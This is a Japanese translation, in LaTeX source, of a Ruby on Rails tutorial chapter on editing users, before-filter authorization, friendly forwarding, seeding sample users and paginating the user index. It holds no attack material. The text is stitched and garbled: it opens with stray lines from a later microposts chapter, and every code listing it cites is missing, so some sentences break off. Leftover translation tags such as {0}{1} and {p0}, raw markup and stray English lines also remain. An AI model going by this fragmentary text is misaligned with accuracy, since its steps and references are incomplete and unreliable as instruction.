\emph{ヒント}: \kode{picture}属性が有効かどうかを確かめるときは、\ref{sec:activation_test_and_refactoring}で紹介した\kode{assigns}メソッドを使ってください。このメソッドを使うと、 投稿に成功した後に\kode{create}アクション内のマイクロポストにアクセスするようになります。
サイドバーでマイクロポストの投稿数をテストするためのテンプレート
"0 microposts"
画像アップロードをテストするためのテンプレート
テスト環境で画像のリサイズ処理をスキップする
この章では、Usersリソース用のRESTアクション (表\ref{table:RESTful_users}) のうち、これまで未実装だった\kode{edit}、\kode{update}、\kode{index}、\kode{destroy}アクションを加え、RESTアクションを完成させます。
まずはユーザーが自分のプロファイルを自分で更新できるようにします。ここで早速第\ref{cha:log_in_log_out}章で実装した認証用のコードを使いますが、これは認可モデルについて説明する自然なキッカケになります。
次に、すべてのユーザーを一覧できるようにします (もちろん認証を要求します)。これはサンプルデータとページネーション (pagnation) を導入する動機にもなります。
最後に、ユーザーを削除し、データベースから完全に消去する機能を追加します。
ユーザーの削除はどのユーザーにも許可できるものではないので、管理ユーザーという特権クラスを作成し、このユーザーにのみ削除を許可するようにします。
<n><n>  \section{ユーザーを更新する} % (fold)<n>  \label{sec:updating_users}<n><n>
ユーザー情報を編集するパターンは、(第\ref{cha:sign_up}章)の新規ユーザーの作成と極めて似通っています。
最大の違いは、ユーザー登録は誰でも実行できますが、ユーザー情報を更新できるのはそのユーザー自身に限られるということです。
{0}{1}第8章{/1}{/0}の認証 (authentication) システムを使えば、\emph{before_action}を使用してこれを行えます。
では最初に、いつものように\kode{updating-users}トピックブランチを作成しましょう。
\kode{edit}アクションの実装から始めますが、ここではデータベースから適切なユーザーデータを読み込む必要があります。
ここで注意して頂きたいのは、表\ref{table:RESTful_users}ではユーザー編集ページの正しいURLが/users/1/editとなっていることです (ユーザーのidが\texttt{1}の場合)。
ユーザーのidは\kode{params[:id]}変数で取り出すことができるのを思い出してください。つまり、リスト\ref{code:initial_edit_action}のコードを使えばそのユーザーを指定できるということです。
ユーザー編集ページのモックアップ
ユーザーの\kode{edit}アクション
ユーザー編集ページに対応するビューを、リスト\ref{code:user_edit_view}に示します (このファイルは手動で作成する必要があります)。
このコードがリスト\ref{code:signup_form}と極めて似通っていることに注目してください。重複が多いということは、それらのコードの繰り返しをパーシャルにまとめることができるということです。パーシャルにまとめる作業は演習の課題 (\ref{sec:updating_deleting_exercises}) に回します。
ユーザーのeditビュー
上のコードでは、リスト\ref{sec:signup_error_messages}で導入した\kode{error\_messages}パーシャルを再利用しています。
ところで、Gravatarへのリンクで\kode{target="_blank"}が使われていますが、これを使うとリンク先を新しいタブ (またはウィンドウ) で開くようになるので、別のWebサイトへリンクするときなどに便利です。
With the \kode{@user} instance variable from Listing~\ref{code:initial_edit_action}, the edit page should render properly, as shown in Figure~\ref{fig:edit_page}.<n><n>リスト\ref{code:initial_edit_action}の\kode{@user}インスタンス変数使うと、編集ページがうまく描画されるようになります (図\ref{fig:edit_page})。
図\ref{fig:edit_page}の"Name"や"Email"の部分を見ると、Railsによって名前やメールアドレスのフィールドに値が自動的に入力されていることがわかります。これらの値は、\kode{@user}変数の属性情報から引き出されています。
図\ref{fig:edit_page}のHTMLソースを見てみると、少しだけ違う箇所もありますが、おおよそformタグは期待どおりに表示されています (リスト\ref{code:edit_form_html})。。
リスト\ref{code:user_edit_view}で定義されたeditフォーム (図\ref{fig:edit_page}) のHTML
以下の入力フィールドに隠し属性があることに注目してください。
Webブラウザはネイティブでは\texttt{PATCH}リクエスト (表\ref{table:RESTful_users}でRESTの慣習として要求されている) を送信できないので、Railsは\texttt{POST}リクエストと隠し\kode{input}フィールドを利用してPATCHリクエストを「偽造」しています
この動作の詳細を気にする必要はありません (悪いことをしているわけでもありません)。この詳細に関心を抱くのはRailsフレームワークそのものの開発者ぐらいであり、Railsでアプリケーションを開発する人にとっては重要ではありません。
ここでもう1つ微妙な点を指摘しておきたいと思います。リスト\ref{code:user_edit_view}の\kode{form\_for(@user)}のコードは、リスト\ref{code:signup_form}のコードと\emph{完全に}同じです。だとすると、Railsはどうやって新規ユーザー用の\texttt{POST}リクエストとユーザー編集用の\texttt{PATCH}リクエストを区別するのでしょうか。
その答えは、Railsは、ユーザーが新規なのか、それともデータベースに存在する既存のユーザーであるかを、Active Recordの\kode{new\_record?}論理値メソッドを使用して区別できるからです。
Railsは、\kode{form\_for(@user)}を使用してフォームを構成すると、\kode{@user.new\_record?}が\kode{true}のときには\texttt{POST}を、\kode{false}のときには\texttt{PATCH}を使用します。
仕上げに、ナビゲーションバーにあるユーザー設定へのリンクを更新します。
表{p0}で示した\kode{edit\_user\_path}という名前付きルートと、 リスト\ref{code:persistent_current_user}で定義した\kode{current\_user}というヘルパーメソッドを使うと、実装が簡単です。
完全なアプリケーションコードをリスト\ref{code:settings_link}に示します。
レイアウトの “Settings” リンクを更新する
本項では、\ref{sec:unsuccessful_signups}のユーザー登録に失敗したときと似た方法で、編集に失敗した場合について扱っていきます。
まずは\kode{update}アクションの作成から進めますが、これはリスト\ref{sec:updating_user_objects}にあるように、\kode{update\_attributes} (\ref{code:user_update_action_unsuccessful}) を使って送信された\kode{params}ハッシュに基いてユーザーを更新します。
無効な情報が送信された場合、更新の結果として\kode{false}が返され、\kode{else}に分岐して編集ページをレンダリングします。
このパターンは以前にも出現したことを覚えているでしょうか。この構造は\kode{create}アクションの最初のバージョン (リスト\ref{code:first_create_action}) と極めて似通っています。
ユーザーの\kode{update}アクションの初期実装
# 更新に成功した場合を扱う。
\kode{update\_attributes}への呼び出しで\kode{user\_params}を使用していることに注目してください。\ref{sec:strong_parameters}でも説明したように、ここではStrong Parametersを使用してマスアサインメントの脆弱性を防止しています。
Userモデルのバリデーションとエラーメッセージのパーシャルが既にあるので (リスト\ref{code:user_edit_view})、無効な情報を送信すると役立つエラーメッセージが表示されるようになっています (図\ref{fig:buggy_edit_with_invalid_information})。
{0}図9.3{/0} {1}更新フォームの送信で発生したエラーメッセージ。{/1}
\ref{sec:unsuccessful_edits}では編集フォームの失敗時を実装しました。
まずはいつものように、統合テストを生成するところから始めます。
最初は編集失敗時の簡単なテストを追加します (リスト\ref{code:unsuccessful_edit_test})。
リスト\ref{code:unsuccessful_edit_test}のテストでは、まず編集ページにアクセスし、editビューが描画されるかどうかをチェックしています。その後、無効な情報を送信してみて、editビューが再描画されるかどうかをチェックします。
ここで、\kode{PATCH}リクエストを送るために\texttt{patch}メソッドを使っていることに注目してください。これは\texttt{get}や\texttt{post}、\texttt{delete}メソッドと同じように、HTTPリクエストを送信するためのメソッドです。
編集の失敗に対するテスト
今度は編集フォームが動作するようにしましょう。
プロファイル画像の編集は、画像のアップロードをGravatarに任せてあるので、既に動作するようになっています。図\ref{fig:edit_page}の [change] リンクをクリックすれば、図\ref{fig:gravatar_cropper}のようにGravatarを編集できます。
ではそれ以外の機能の実装にとりかかりましょう。
\href{http://gravatar.com/}{Gravatar}の画像調整インターフェイス (写真は\href{http://www.michaelhartl.com/}{誰かさん})
そろそろ、より快適にテストをするためには、アプリケーション用のコードを「実装する前に」統合テストを書いた方が便利だと気付いた読者もいるかもしれません。
実際、そういったテストのことは「\emph{受け入れテスト (Acceptance Tests)}」として呼ばれていて、ある機能の実装が完了し、受け入れ可能な状態になったかどうかを決めるテストとして知られています。
実際に体験してもらうために、今回はテスト駆動開発を使ってユーザーの編集機能を実装してみましょう。
まずは、リスト\ref{code:unsuccessful_edit_test}のテストを参考にして、ユーザー情報を更新する正しい振る舞いをテストで定義します (今回は有効な情報を送信するように修正します)。
次に、flashメッセージが空でないかどうかと、プロフィールページにリダイレクトされるかどうかをチェックします。また、データベース内のユーザー情報が正しく変更されたかどうかも検証します。
作成したコードをリスト\ref{code:successful_edit_test}に示します
このとき、リスト\ref{code:successful_edit_test}のパスワードとパスワード確認が空であることに注目してください。ユーザー名やメールアドレスを編集するときに毎回パスワードを入力するのは不便なので、(パスワードを変更する必要が無いときは) パスワードを入力せずに更新できると便利です。
また、\ref{sec:updating_user_objects}で紹介した\kode{@user.reload}を使って、データベースから最新のユーザー情報を読み込み直して、正しく更新されたかどうかを確認している点にも注目してください。
(こういった正しい振る舞いというのは一般に忘れがちですが、受け入れテスト (もしくは一般的なテスト駆動開発) では先にテストを書くので、効果的なユーザー体験について考えるようになります。)
編集の成功に対するテスト
テストにパスする必要のある、リスト{p0}の\kode{update}アクションは、リスト\ref{code:login_upon_signup}に示したように、\kode{create}アクション (リスト\ref{code:user_update_action}) の最終的なフォームとほぼ同じです。
ユーザーの\kode{update}アクション 
これはリスト\ref{code:successful_edit_test}で使用されていました。
テストが \passing になるためには、パスワードのバリデーションに対して、空だったときの例外処理を加える必要があります。
こういったときに便利な\kode{allow\_nil: true}というオプションがあるので、これを \kode{validates}に追加します (リスト\ref{code:allow_blank_password})。
パスワードが空のままでも更新できるようにする 
このコードを追加したことにより、ユーザー編集ページが動くようになります (図\ref{fig:edit_form_working})。すべてのテストを走らせてみて \passing\ したかどうか確かめてみてください。
編集に成功した結果
ウェブアプリケーションの文脈では、\emph{認証} (authentication) はサイトのユーザーを識別することであり、\emph{認可} (authorization) はそのユーザーが実行可能な操作を管理することです。
{0}{1}第8章{/1}{/0}で認証システムを構築したことで、認可のためのシステムを実装する準備もできました。
\ref{sec:updating_users}のeditアクションとupdateアクションはすでに完全に動作していますが、セキュリティ上の大穴が1つ空いています。 どのユーザーでもあらゆるアクションにアクセスでき、ログインさえしていれば他のユーザーの情報を編集できてしまいます。
この節では、ユーザーにログインを要求し、かつ自分以外のユーザー情報を変更できないようにするセキュリティモデルを構築しましょう。
\ref{sec:requiring_logged_in_users}では、ログインしていないユーザーが保護されたページにアクセスしようとした際のケースについて対処していきます。
こういったケースはアプリケーションを使っていると普通に起こることなので、ログインページに転送して、そのときに分かりやすいメッセージも表示するようにしましょう。モックアップを図\ref{fig:login_page_protected_mockup}に示します。
一方で、許可されていないページに対してアクセスするログイン済みのユーザーがいたら (たとえば他人のユーザー編集ページにアクセスしようとしたら)、ルートURLにリダイレクトさせるようにします (\ref{sec:requiring_the_right_user})。
<n><n>\begin{figure}<n>\begin{center}<n>\imagebox{images/figures/login_page_protected_mockup.png}<n>\end{center}<n>\caption{A mockup of the result of visiting a protected page\label{fig:login_page_protected_mockup}}<n>\end{figure}<n><n>    \subsection{ユーザーにログインを要求する} % (fold)<n>    \label{sec:requiring_logged_in_users}<n><n>
図\ref{fig:login_page_protected_mockup}のように転送させる仕組みを実装したいときは、Usersコントローラの中で\emph{beforeフィルター}を使います。
beforeフィルターは、\kode{before\_action}メソッドを使って何らかの処理が実行される直前に特定のメソッドを実行する仕組みです
今回はユーザーにログインを要求するために、リスト\ref{code:authorize_before_filter}のように\kode{logged\_in\_user}メソッドを定義して\kode{before\_action :logged\_in\_user}という形式で使います。
beforeフィルターに\kode{logged\_in\_user}を追加する 
デフォルトでは、beforeフィルターはコントローラ内の\emph{すべての}アクションに適用されるので、ここでは適切な\kode{:only}オプションハッシュを渡すことによって\kode{:edit}と\kode{:update}アクションにのみこのフィルタが適用されるように制限をかけています。
beforeフィルターを使って実装した結果 (リスト\ref{code:authorize_before_filter}) は、一度ログアウトしてユーザー編集ページ (\href{http://localhost:3000/users/1/edit}{/users/1/edit}) にアクセスしてみることで確認できます (図\ref{fig:protected_log_in})。
保護されたページにアクセスした直後のログインフォーム
原因は、editアクションやupdateアクションでログインを要求するようになったため、ログインしていないユーザーだとこれらのテストが失敗するようになったためです。
このため、editアクションやupdateアクションをテストする前にログインしておく必要があります。
解決策は簡単で、 {p0}で開発した\kode{log\_in\_as}ヘルパー  (リスト\ref{code:test_helper_log_in}) を使うことです。修正した結果をリスト\ref{code:edit_tests_logged_in}に示します。
テストユーザーでログインする 
(リスト\ref{code:edit_tests_logged_in}の\kode{setup}メソッド内でログイン処理をまとめてしまうことも可能です。しかし、\ref{sec:friendly_forwarding}で片方のテストをログインする\emph{前に}編集ページにアクセスするように変更したいので、ここでまとめてしまっても結局は元に戻すことになってしまいます。)
今度はテストスイートがパスするはずです。
これでテストスイートがパスするようになりましたが、実はbeforeフィルターの実装はまだ終わっておりません。セキュリティモデルに関する実装を取り外してもテストが \passing になってしまうかどうか、実際にコメントアウトして確かめてみましょう (リスト\ref{code:commented_out_before_filter})。
テストを書いて、この問題に対処しましょう。
セキュリティモデルを確認するためにbeforeフィルターをコメントアウトする
beforeフィルターは基本的にアクションごとに適用していくので、Usersコントローラのテストもアクションごとに書いていきます。具体的には、正しい種類のHTTPリクエストを使って\kode{edit}アクションと\kode{update}アクションをそれぞれ実行させてみて、flashにメッセージが代入されたかどうか、ログイン画面にリダイレクトされたかどうかを確認してみましょう。
表\ref{table:RESTful_users}から、適切なリクエストはそれぞれ\texttt{GET}と\texttt{PATCH}であることがわかります。したがって、テスト内では\kode{get}メソッドと\kode{patch}メソッドを使います。
変更の結果をリスト\ref{code:edit_update_redirect_tests}に示します。
\kode{edit}と\kode{update}アクションの保護に対するテストする 
ここで、\kode{get}も\kode{patch}も次のように
上のコードでは、Railsの慣習によって\kode{id: @user}という引数が自動的に\kode{@user.id}に変換されています (これはコントローラでリダイレクトしたときと同様です)。
2つ目のケースでは、ルーティングで正しく処理されるように\kode{user}というハッシュも渡しています。
(実は{0}{1}第2章{/1}{/0}のToyアプリケーションのUsersコントローラではテストも生成されていて、中を見ると上と同じコードになっています。)
beforeフィルターのコメントアウトを元に戻して、 \passing\ になるかどうか確かめてみましょう (リスト\ref{code:uncommented_before_filter})。
beforeフィルターを再び有効化する 
コメントアウトしていた箇所を元に戻すと、テストが \passing\ するようになるはずです。
これらのテストを実装したことによって、うっかり誰でも編集できてしまうバグがあっても、すぐに検知できるようになりました。
当然のことですが、ログインを要求するだけでは十分ではありません。ユーザーが\emph{自分の情報だけを}編集できるようにする必要があります。
\ref{sec:requiring_logged_in_users}では、深刻なセキュリティ上の欠陥を見逃してしまうテストを見てきました。そこで本項では、セキュリティモデルが正しく実装されている確信を持つために、テスト駆動開発で進めていきます。
したがって、Usersコントローラのテスト (リスト\ref{code:edit_update_redirect_tests}) を補完するように、テストを追加するところから始めていきます。
まずはユーザーの情報が互いに編集できないことを確認するために、サンプルユーザーをもう一人追加します。
ユーザー用のfixtureファイルに2人目のユーザーを追加してみましょう (リスト\ref{code:fixture_second_user})。
fixtureファイルに２人目のユーザーを追加する
次に、 リスト\ref{code:test_helper_log_in}で定義した\kode{log\_in\_as}メソッドを使って、\kode{edit}アクションと\kode{update}アクションをテストします (リスト\ref{code:edit_update_wrong_user_tests})。
このとき、既にログイン済みのユーザーを対象としているため、ログインページではなくルートURLにリダイレクトしている点に注意してください。
間違ったユーザーが編集しようとしたときのテスト 
別のユーザーのプロフィールを編集しようとしたらリダイレクトさせたいので、\kode{correct\_user}というメソッドを作成し、beforeフィルターからこのメソッドを呼び出すようにします (リスト\ref{code:correct_user_before_filter})。
beforeフィルターの\kode{correct\_user}で\kode{@user}変数を定義しているため、リスト\ref{code:correct_user_before_filter}では\kode{edit}と\kode{update}の各アクションから、\kode{@user}への代入文を削除している点にも注意してください。
beforeフィルター (\kode{correct_user}) を使って編集と更新を保護する 
今度はテストスイートが \passing するはずです。
このメソッドを使うと今までの
といった部分が、次のように (少し) 分かりやすいコードになります。
The \kode{current\_user?} 
先ほどのメソッドを使って比較演算していた行を置き換えると、リスト\ref{code:correct_user_before_filter_boolean}になります。
最終的な\kode{correct\_user}の実装 
ここまででWebサイトの認可機能は完成したかのように見えますが、後1つ小さなキズがあります。保護されたページにアクセスしようとすると、問答無用で自分のプロファイルページに移動させられてしまいます。
別の言い方をすれば、ログインしていないユーザーが編集ページにアクセスしようとしていたなら、ユーザーがログインした後にはその編集ページにリダイレクトされるようにするのが望ましい動作です。
リダイレクト先は、ユーザーが開こうとしていたページにしてあげるのが親切というものです。
実際のコードは少し複雑ですが、フレンドリーフォワーディングのテストは非常にシンプルに書くことができます。ログインした後に編集ページへのアクセスする、という順序を逆にしてあげるだけです (リスト\ref{code:edit_tests_logged_in})。
リスト\ref{code:friendly_forwarding_test}が示すように、実際のテストはまず編集ページにアクセスし、ログインした後に、(デフォルトのプロフィールページではなく) \emph{編集}ページにリダイレクトされているかどうかをチェックするといったテストです。
(なお、リダイレクトによってedit用のテンプレートが描画されなくなったので、リスト\ref{code:friendly_forwarding_test}では該当するテストを削除しています)
フレンドリーフォワーディングのテスト 
失敗するテストが書けたので、ようやくフリンドリーフォワーディングを実装する準備ができました
このセクションのコードでは、\href{http://github.com/thoughtbot/clearance}{thoughtbot}社が提供する\href{http://thoughtbot.com/}{Clearance} gemを適用しています。
ユーザーを希望のページに転送するには、リクエスト時点のページをどこかに保存しておき、その場所にリダイレクトさせる必要があります。
この動作を\kode{store\_location}と\kode{redirect\_back\_or}の2つのメソッドを使用して実現してみましょう。なお、これらのメソッドはSessionsヘルパーで定義しています (リスト\ref{code:friendly_forwarding_code})。
フレンドリーフォワーディングの実装
# 記憶したURL (もしくはデフォルト値) にリダイレクト
転送先のURLを保存する仕組みは、\ref{sec:a_working_log_in_method}でユーザーをログインさせたときと同じで、\kode{session}変数を使います。
また、リクエスト先のURLを取得するために、リスト\ref{code:friendly_forwarding_code}では\kode{request}オブジェクトも使っています (\kode{request.url}でリクエスト先が取得できます)。
リスト\ref{code:friendly_forwarding_code}の\kode{store\_location}メソッドでは、 リクエストが送られたURLを\kode{session}変数の\kode{:forwarding\_url}キーに格納しています。ただし、\kode{GET}リクエストが送られたときだけ格納するようにしておきます。
これによって、たとえばログインしていないユーザーがフォームを使って送信した場合、転送先のURLを保存させないようにできます。これは稀なケースですが起こり得ます。たとえばユーザがセッション用のcookieを手動で削除してフォームから送信するケースなどです。
こういったケースに対処しておかないと、\kode{POST}や \kode{PATCH}、\kode{DELETE}リクエストを期待しているURLに対して、(リダイレクトを通して) \kode{GET}リクエストが送られてしまい、場合によってはエラーが発生します。
このため、\kode{if request.get?}という条件文を使ってこのケースの対策しています
Yoel Adlerの指摘によって、この問題と解決策が見つかりました。感謝いたします。
selfを省略した結果をリスト\ref{code:add_store_location}に示します。
ログインユーザー用beforeフィルターに\kode{store\_location}を追加する
フォワーディング自体を実装するには、\kode{redirect\_back\_or}メソッドを使用します。リクエストされたURLが存在する場合はそこにリダイレクトし、ない場合は何らかのデフォルトのURLにリダイレクトします。デフォルトのURLは、Sessionコントローラの\kode{create}アクションに追加し、サインイン成功後にリダイレクトします (リスト\ref{code:friendly_session_create})。
\kode{redirect\_back\_or}メソッドでは、次のようにor演算子\kode{||}を使用します。
(このコードのテストは\ref{sec:updating_deleting_exercises}の演習とします)。
ちなみに、最初にredirect文を実行しても、セッションが削除される点を覚えておくとよいでしょう。実は、明示的に\kode{return}文やメソッド内の最終行が呼び出されない限り、リダイレクトは発生しません。したがって、redirect文の後にあるコードでも、そのコードは実行されるのです。
フレンドリーフォワーディングを備えた\kode{create}アクション
これで、リスト\ref{code:friendly_forwarding_test}のフレンドリーフォワーディング用統合テストはパスするはずです。成功すれば、基本ユーザー認証機能とページ保護機能の実装は完了です。
いつものように、以下を実行してテストスイートが \passing\ になることを確認してから先に進みましょう。
この節では、いよいよ\href{http://www.answers.com/penultimate}{最後から2番目の}ユーザーアクションである\kode{index}アクションを追加しましょう。このアクションは、\emph{すべての}ユーザーを一覧表示します。
その際、データベースにサンプルデータを追加する方法や、将来ユーザー数が膨大になってもindexページを問題なく表示できるようにするためのユーザー出力の\emph{ページネート (paginate=ページ分割)} の方法を学びます。
ユーザーの一覧、ページネーション用リンク、移動用の [Users] リンクのモックアップを図\ref{fig:user_index_mockup}に示します
ユーザー一覧ページのモックアップ
\label{fig:user_index_mockup}}<n>\end{figure}<n><n><n>    \subsection{ユーザーインデックス} % (fold)<n>    \label{sec:users_index}<n><n>
ユーザーの一覧ページを実装するために、まずはセキュリティモデルについて考えてみましょう。
ユーザーの\kode{show}ページについては、今後も (ログインしているかどうかに関わらず) サイトを訪れたすべてのユーザーから見えるようにしておきますが、ユーザーの\kode{index}ページはログインしたユーザーにしか見せないようにし、未登録のユーザーがデフォルトで表示できるページを制限します
ちなみにこれはTwitterの認可モデルと同じです。
\kode{index}ページを不正なアクセスから守るために、まずは\kode{index}アクションが正しくリダイレクトするか検証するテストを書いてみます (リスト\ref{code:index_action_redirected_test})。
\kode{index}アクションのリダイレクトをテストする 
次に、beforeフィルターの\kode{logged\_in\_user}に\kode{index}アクションを追加して、このアクションを保護します (リスト\ref{code:logged_in_user_index})。
\kode{index}アクションにはログインを要求する 
今度はすべてのユーザーを表示するために、全ユーザーが格納された変数を作成し、順々に表示するindexビューを実装します。
Toyアプリケーションにも同じindexアクションがあったことを思い出してください (リスト\ref{code:demo_index_action})。そのときと同様に、\kode{User.all}を使ってデータベース上の全ユーザーを取得し、ビューで使用可能な\kode{@users}というインスタンス変数に代入させます (リスト\ref{code:user_index})。
(すべてのユーザーを一気に読み出すとデータ量が多い場合に問題が生じるのではないかと思われた方、そのとおりです。このキズは\ref{sec:pagination}で修正します。)
ユーザーの\kode{index}アクション
実際のインデックスページを作成するには、ユーザーを列挙してユーザーごとに\kode{li}タグで囲むビューを作成する必要があります。
ここでは\kode{each}メソッドを使用してこれを行います。それぞれの行をリストタグ\kode{ul}で囲いながら、各ユーザーのGravatarと名前を表示します (リスト\ref{code:user_index_view})。
ユーザーのindexビュー
リスト\ref{code:user_index_view}では、\ref{code:gravatar_option}の演習のリスト\ref{sec:signup_exercises}の結果を利用しています。これは、Gravatarヘルパーにデフォルト以外のサイズを指定するオプションを渡します。
この演習をまだやっていない場合は、リスト\ref{code:gravatar_option}に従ってUsersヘルパーファイルを更新してから先に進んでください。
CSS (正確にはSCSSですが) にもちょっぴり手を加えておきましょう (リスト\ref{code:user_index_css})。
ユーザーのindexページ用のCSS
最後に、サイト内移動用のヘッダーにユーザー一覧表示用のリンクを追加します。これには\kode{users\_path}を使用し、表\ref{table:RESTful_users}に残っている最後の名前付きルートを割り当てます。
作成したコードをリスト\ref{code:users_link}に示します
ユーザー一覧ページへのリンクを更新する
これでユーザーのインデックスは完全に動くようになり、テストも全て \passing するようになります。
もう少し何とかしてみましょう。
ユーザー一覧ページにユーザーが1人しか表示されていない
この節では、一人ぼっちのユーザーに仲間を加えてあげることにします。
複数のユーザーが表示されたユーザーインデックスページにするためには、ブラウザでサインアップページを表示してユーザーを手作業で1人ずつ追加するという方法も\emph{ありますが}、せっかくなのでRubyとRakeを使用してユーザーを一気に作成しましょう。
次に、いつものように以下を実行します。
では、サンプルユーザーを生成するRakeタスクを追加してみましょう。Railsでは\kode{db/seeds.rb}というファイルを標準として使います。
作成したコードをリスト\ref{code:db_seed}に示します
(リスト\ref{code:db_seed}のコードは少し応用的です。詳細が完全に理解できなくても問題ありません)
データベース上にサンプルユーザーを生成するRakeタスク
リスト\ref{code:db_seed}のコードでは、Example Userという名前とメールアドレスを持つ1人のユーザと、それらしい名前とメールアドレスを持つ99人のユーザーを作成します。
\kode{create!}は基本的に\kode{create}メソッドと同じものですが、ユーザーが無効な場合に\kode{false}を返すのではなく例外を発生させる (\ref{sec:finding_user_objects}) 点が異なります。
こうしておくと見過ごしやすいエラーを回避できるので、デバッグが容易になります。
それでは、データベースをリセットして、リスト\ref{code:db_seed}のRakeタスクを実行 (\kode{db:seed}) してみましょう
原理的には、\kode{rake db:reset}コマンド1つでこれら2つのタスクを実行することがもできますが、最新のRailsだとうまく動かないのでこのようにしています。
データベース上にデータを追加するのは遅くなりがちで、システムによっては数分かかることもあり得ます。
\kode{db:seed}でRakeタスクを実行し終わると、サンプルアプリケーションのユーザーが100人になっています。
図\ref{fig:user_index_all}が示すように、 最初のいくつかのメールアドレスについては、デフォルトのGravatar画像以外の写真を関連付けてみました。
(システム環境によっては、ここでRailsを再起動させる必要があるかもしれません。)
ユーザー一覧ページに100人のサンプルユーザーが表示されている
これで、最初のユーザーにも仲間ができました。しかし今度は逆に、1つのページに\emph{大量の}ユーザーが表示されてしまっています。
100人でもかなり大きい数であると思いますし、今後は数千ユーザーに増える可能性もあります。
これを解決するのが\emph{ページネーション (pagination) }というもので、この場合は、たとえば1つのページに一度に30人だけユーザーを表示するというものです。
Railsには豊富なページネーションメソッドがあります。今回はその中で最もシンプルかつ堅牢な\href{http://wiki.github.com/mislav/will_paginate/}{will_paginate}メソッドを使用してみましょう。
これはリスト\ref{code:will_paginate_gem}で使用されていました。
次に\kode{bundle install}を実行します。
新しいgemが正しく読み込まれるように、Webサーバーを再起動してください。
ページネーションが動作するには、ユーザーのページネーションを行うようにRailsに指示するコードをindexビューに追加する必要があります。また、\kode{index}アクションにある\kode{User.all}を、ページネーションを理解できるオブジェクトに置き換える必要もあります。
まずは、ビューに特殊な\kode{will\_paginate}メソッドを追加しましょう (リスト\ref{code:will_paginate_index_view})。同じコードがリストの上と下に2つありますが、その理由はこの後で説明します。
ユーザー一覧ページでpaginationを使う
この\kode{will\_paginate}メソッドは少々不思議なことに、\kode{users}ビューのコードの中から\kode{@users}オブジェクトを自動的に見つけ出し、それから他のページにアクセスするためのページネーションリンクを作成しています。
ただし、リスト\ref{code:will_paginate_index_view}のビューはこのままでは動きません。というのも、現在の\kode{@users}変数には\kode{User.all}の結果が含まれていますが (リスト\ref{code:user_index})、\kode{will\_paginate}では\kode{paginate}メソッドを使った結果が必要だからです。必要となるデータの例は次のとおりです。
\kode{paginate}では、キーが\kode{:page}で値がページ番号のハッシュを引数に取ります。
従って、1ページ目は1から30のユーザー、2ページ目は31から60のユーザーといった具合にデータが取り出されます。ちなみに\kode{page}が\kode{nil}の場合、 \kode{paginate}は単に最初のページを返します。
\kode{paginate}を使用することで、サンプルアプリケーションのユーザーのページネーションを行えるようになります。具体的には、\kode{index}アクション内の\kode{all}を\kode{paginate}メソッドに置き換えます (リスト\ref{code:will_paginate_index_action})。
ここで\kode{:page}パラメーターには\kode{params[:page]}が使用されていますが、これは\kode{will\_paginate}によって自動的に生成されます。
\kode{index}アクションでUsersをページネートする
以上で、ユーザー一覧ページは図\ref{fig:user_index_pagination}のように動作するはずです
(システム環境によっては、ここでRailsを再起動する必要があるかもしれません)。
\kode{will\_paginate}をユーザーリストの上と下の両方に配置してあるので、ページネーションのリンクもページの上と下の両方に表示されています。
ページネーションされたユーザー一覧ページ
[\href{http://localhost:3000/users?page=2}{2}] リンクまたは [\href{http://localhost:3000/users?page=2}{Next}] リンクをクリックすると、図\ref{fig:user_index_page_two_rails_3}のように次のページに移動します。
ユーザー一覧の2ページ目
これでユーザー一覧ページが動くようになったので、\ref{sec:pagination}のページネーションに対する簡単なテストも書いておきましょう。
今回のテストでは、ログイン、indexページにアクセス、最初のページにユーザーがいることを確認、ページネーションのリンクがあることを確認、といった順でテストしていきます。
最後の2つのステップでは、テスト用のデータベースに31人以上のユーザーがいる必要があります。
 リスト\ref{code:fixture_second_user}で2人目のユーザーをfixtureに追加しましたが、今回はもっと多くのユーザーを作成する必要があります。手動で追加するのは面倒そうですね。
幸運には、ユーザー用fixtureファイルの\kode{password\_digest}属性で使ったように、fixtureでは埋め込みRubyをサポートしています。これを利用してさらに30人のユーザーを追加してみましょう (リスト\ref{code:users_fixtures_extra_users})。
なお、今後必要になるので、リスト\ref{code:users_fixtures_extra_users}では2人の名前付きユーザーも一緒に追加しています。
fixtureにさらに30人のユーザーを追加する
リスト\ref{code:users_fixtures_extra_users}のfixtureファイルができたので、indexページに対するテストを書いてみます。
まずは、いつものように統合テストを生成します。
今回のテストでは、\kode{pagination}クラスを持った\kode{div}タグをチェックして、最初のページにユーザーがいることを確認します。
作成したコードをリスト\ref{code:user_index_test}に示します
ページネーションを含めたUsersインデックスのテスト
このテストは \passing\ するはずです。
ユーザー一覧ページにページネーションを実装することができましたが、私はここで1つの改良を加えてみたいのです。実はRailsにはコンパクトなビューを作成するための素晴らしいツールがいくつもあります。この節ではそれらのツールを使用して一覧ページのリファクタリング (動作を変えずにコードを整理すること) を行うことにします。
サンプルアプリケーションのテストは既に完了しているので、Webサイトの機能を損なうことなく安心してリファクタリングに取りかかれます。
リファクタリングの第一歩は、リスト\ref{code:index_view_first_refactoring}のユーザーの\kode{li}を\kode{render}呼び出しに置き換えることです (リスト\ref{code:index_view_first_refactoring})。
indexビューに対する最初のリファクタリング
この\kode{user}という名前そのものはまったく重要ではないことに注意してください。たとえばuserをfoobarに置き換え、\kode{@users.each do |foobar|}と書いてから\kode{render foobar}と呼び出しても問題なく動作します。
重要なのは、そのオブジェクトそのものではなく、そのオブジェクトが属している\emph{クラス} (この場合は\kode{User}クラス) の方です。
各ユーザーを表示するパーシャル
これは間違いなく大きな進歩です。しかしここで終わらせず、さらに改良してみましょう。今度は\kode{render}を\kode{@users}変数に対して\emph{直接}実行します (\ref{code:index_final_refactoring})。
ユーザー一覧ページの完全なリファクタリング 
これにより、リスト\ref{code:index_final_refactoring}のコードは極めてコンパクトになります。
これに限らず、リファクタリングを行う場合には、アプリケーションのコードを変更する前と後で必ずテストを実行し、いずれも \passing\ になることを確認するようにしてください。
ユーザーの一覧ページはついに完了しました。残るは\kode{destroy}だけです。これを実装することで、RESTに準拠した正統なアプリケーションとなります。
この節では、ユーザーを削除するためのリンクを追加します。モックアップを図\ref{fig:user_index_delete_links_mockup}に示します。また、削除を行うのに必要な\kode{destroy}アクションも実装します。
しかしその前に、削除を実行できる権限を持つ\emph{管理 (admin) }ユーザーのクラスを作成しましょう。
削除リンクを追加したユーザー一覧のモックアップ
\label{fig:user_index_delete_links_mockup}}<n>\end{figure}<n><n>    \subsection{管理ユーザー} % (fold)<n>    \label{sec:administrative_users}<n><n>
